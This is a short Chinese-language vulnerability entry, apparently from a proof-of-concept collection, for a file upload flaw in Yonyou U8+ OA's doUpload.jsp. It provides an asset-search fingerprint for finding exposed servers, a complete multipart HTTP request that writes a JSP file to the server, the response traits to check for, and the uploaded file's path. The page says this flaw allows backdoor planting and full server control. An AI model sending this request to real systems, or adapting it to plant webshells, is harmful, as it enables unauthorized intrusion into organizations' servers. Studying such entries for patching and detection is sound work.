﻿# 用友U8+OA doUpload.jsp 文件上传漏洞

> 更新时间：2024-02-20

> 漏洞编号：

> 漏洞说明：用友U8+ OA经过20多年的市场锤炼，不断贴近客户需求，以全新UAP为平台，应对中型及成长型企业客户群的发展，提供的是一整套企业级数智化升级解决方案，为成长型企业构建精细管理、产业链协同、社交化运营为一体的企业互联网经营管理平台，助力企业应势而变，赢得未来。

用友U8+ OA doUpload.jsp 接口存在文件上传漏洞，攻击者可通过该漏洞在服务器端写入后门文件，任意执行代码，获取服务器权限，进而控制整个 web 服务器。

> 漏洞特征："用友U8-OA" && body="yyoa"

> 验证脚本：HTTP

```
POST /yyoa/portal/tools/doUpload.jsp HTTP/1.1
Connection: close
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Content-Type: multipart/form-data; boundary=----syowx9dzsw75xlftuop1

------syowx9dzsw75xlftuop1
Content-Disposition: form-data; name="iconFile";filename="dudesite.jsp"

<% out.println("dudesite"); %>    
------syowx9dzsw75xlftuop1--
```

> 响应代码特征：200

> 响应内容特征：jsp

> 上传文件定位：/yyoa/portal/upload/dudesite.jsp


> 验证文件来源：用友U8+OA doUpload.jsp 文件上传漏洞.poc
